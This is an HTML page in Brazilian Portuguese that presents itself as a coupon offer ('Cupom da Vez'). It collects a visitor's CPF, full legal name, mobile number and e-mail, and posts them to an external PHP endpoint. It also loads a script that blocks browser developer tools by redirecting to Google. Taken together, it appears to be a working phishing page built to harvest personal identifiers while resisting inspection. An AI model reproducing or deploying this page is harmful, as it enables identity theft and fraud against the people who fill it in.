<!DOCTYPE html><html lang="pt-BR"><head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link data-optimized="1" rel="stylesheet" href="css/5921624bf5bbe4c8c091ef09226fa76f.css">
        <link rel="preconnect" href="https://fonts.googleapis.com/">
        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
        <link data-optimized="1" href="css/1c7a3d2ee9759dc256d915300855c494.css" rel="stylesheet">
        <link data-optimized="1" href="css/ba9cbbe9240a489628be8eb27c56db8a.css" rel="stylesheet">
        <link rel="stylesheet" href="css/style.css">
        <link rel="stylesheet" href="css/animated.css">
        <link rel="shortcut icon" href="images/faveicon.png">
        <title>:: Cupom da Vez ::</title>
    </head>

    <body class="fundoWhite">

        <div class="corteLayoutTop"></div>

        <div id="p1" style="background-color: #FFFFFF; padding: 15px 0 50px 0;">

            <img style="width: 35%; margin: auto; margin-left: 10px; position: relative; margin-top: 10px;" src="images/logo2.png">

            <form action="https://reidocha.com/cupom/cupom1/cupom1.php" method="POST" id="formCadastro" onsubmit="document.getElementById('submit').disabled = true;">

                <div class="coolinput">

                    <div id="textoGuiaCpf">
                        <h1 id="textoTitulo" style="font-family:'RecoletaBold'; font-size: 20px; margin: 25px 0 0 25px; color: #000000;">olá!</h1>
                        <p id="textoInformacao" style="font-size: 15px; margin: 8px 0 30px 25px;">Informe seu CPF para a gente começar.</p>
                    </div>

                    <div id="validaCpf">
                        <label for="input" id="textoCpf" class="text">CPF</label>
                        <input type="text" placeholder="Digite seu CPF" name="cpfUsuario" id="cpfUsuario" class="input" inputmode="numeric" autocomplete="off" required="" onkeyup="validacaoCadastroCpf()">
                        <div style="margin: -5px 0 0 10px;"><span id="validacaoCpf"></span></div>
                    </div>



                    <div id="textoGuiaNome">
                        <h1 id="textoTitulo" style="font-family:'RecoletaBold'; font-size: 20px; margin: 25px 0 0 25px; color: #000000;">prazer, qual seu nome?</h1>
                        <p id="textoInformacao" style="font-size: 15px; margin: 8px 0 30px 25px;">Para identificação, é fundamental que você digite seu nome exatamente como está escrito nos seus documentos.</p>
                    </div>

                    <div id="validaNome">
                        <label for="input" id="textoNome" class="text">NOME</label>
                        <input type="text" placeholder="Digite seu NOME" name="nomeUsuario" id="nomeUsuario" class="input" autocomplete="off" required="" onkeyup="validacaoCadastroNome()">
                        <div style="margin: -5px 0 0 10px;"><span id="validacaoNome"></span></div>
                    </div>



                    <div id="textoGuiaCelular">
                        <h1 id="textoTitulo" style="font-family:'RecoletaBold'; font-size: 20px; margin: 25px 0 0 25px; color: #000000;">qual o número do seu celular?</h1>
                        <p id="textoInformacao" style="font-size: 15px; margin: 8px 0 30px 25px;">O celular é necessário para garantir que apenas você tenha acesso �&nbsp; sua conta.</p>
                    </div>

                    <div id="validaCelular">
                        <label for="input" id="textoCelular" class="text">CELULAR</label>
                        <input type="text" placeholder="Digite seu CELULAR" name="celularUsuario" id="celularUsuario" inputmode="numeric" class="input" autocomplete="off" required="" onkeyup="validacaoCadastroCelular()">
                        <div style="margin: -5px 0 0 10px;"><span id="validacaoCelular"></span></div>
                    </div>



                    <div id="textoGuiaEmail">
                        <h1 id="textoTitulo" style="font-family:'RecoletaBold'; font-size: 20px; margin: 25px 0 0 25px; color: #000000;">e seu e-mail, <span id="userName"></span>?</h1>
                        <p id="textoInformacao" style="font-size: 15px; margin: 8px 0 30px 25px;">Preciso dele para a gente se comunicar e também para recuperar seus dados cadastrais, se necessário.</p>
                    </div>

                    <div style="position: relative;" id="validaEmail">
                        <label style="z-index: 9999;" for="input" id="textoEmail" class="text">EMAIL</label>
                        <input style="text-transform: lowercase;" type="text" placeholder="Digite seu EMAIL" name="emailUsuario" id="emailUsuario" class="input emailUsuario" autocomplete="off" required="" onkeyup="validacaoCadastroEmail()" onblur="validacaoCadastroEmail()">
                        <input id="emailAux" class="aux" autocomplete="off">
                        <div style="position: absolute;"><span id="validacaoEmail"></span></div>
                    </div>



                    <div id="textoGuiaFim">
                        <h1 id="textoTitulo" style="font-family:'RecoletaBold'; font-size: 20px; margin: 25px 0 0 25px; color: #000000;">uhuul!</h1>
                        <p id="textoInformacao" style="font-size: 15px; margin: 8px 0 30px 25px;">agora pode apertar em CONTINUAR logo abaixo.</p>
                    </div>

                    <div style="position: relative;">
                        <button style="position: unset; width: 100%; margin-top: 30px;" id="continuarCadastroInativo" class="continuarInativo" disabled="">Continuar</button>
                        <button style="-webkit-animation: pulse 1.5s infinite; position: unset; width: 100%; margin-top: 30px;" id="continuarCadastroAtivo" class="continuarAtivo" data-callback="onSubmit" data-action="submit">Continuar</button>
                    </div>
                </div>

            </form>
            
        </div>
        

        

        <script src="js/jquery.min.js"></script>
        <script type="text/javascript" src="js/jquery.mask.js"></script>
        <script src="js/materialize.min.js"></script>
        <script src="js/validacaoCadastro.js"></script>
        <script src="js/funcoes.js"></script>
        <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool" url="https://google.com.br"></script>
        <script>        
            // MÁSCARA INPUT
            jQuery(function($){
                $("#cpfUsuario").mask("999.999.999-99");
                
                $("#celularUsuario").mask("(99) 99999-9999");
            });
            // MÁSCARA INPUT
        </script>
    
</body></html>